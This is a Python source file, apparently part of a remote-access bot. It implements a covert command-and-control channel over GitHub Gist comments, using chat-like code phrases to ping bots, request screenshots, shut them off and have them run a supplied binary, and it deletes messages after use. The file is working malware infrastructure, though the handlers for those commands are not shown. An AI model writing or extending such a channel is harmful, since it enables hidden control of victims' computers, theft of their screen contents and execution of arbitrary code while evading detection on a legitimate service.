from github import Github
from github.GistComment import GistComment
from typing import List


class Channel:

    PING_REQUEST = "Who's still working on this?"
    PING_RESPONSE = "Me!"

    UPLOAD_REQUEST = "Could you send me a screenshot?"
    UPLOAD_RESPONSE = "Sure, man!"

    SHUT_OFF_REQUEST = "It's time to go to sleep!"
    SHUT_OFF_RESPONSE = "Okay, going to be now..."

    BINARY_REQUEST = "Could you do me a favor and try running this?"
    BINARY_RESPONSE = "Sure can!"

    def __init__(self, token: str, gist: str):
        self.connector = Github(token)
        self.gist = self.connector.get_gist(gist)
        self.last_comment = 0

    def check_messages(self) -> List[GistComment]:
        """
        Checks for new messages
        :return: a list of comments containing new messages
        """
        try:
            comments = list(self.gist.get_comments())
        except Exception:
            comments = []

        new_comments = []

        if not comments:
            return new_comments

        for comment in comments:
            if comment.id > self.last_comment:
                new_comments.append(comment)

        self.last_comment = comments[len(comments) - 1].id

        return new_comments

    def send_message(self, message: str) -> GistComment:
        """
        Sends a message to the channel
        :param message: Message to send
        :return: an GistComment object containing the sent message
        """
        new_comment = self.gist.create_comment(message)
        self.last_comment = new_comment.id
        return new_comment

    def delete_message(self, message_id: int):
        """
        Removes a message from the channel
        :param message_id: Message ID
        """
        comment = self.gist.get_comment(message_id)

        if comment:
            comment.delete()
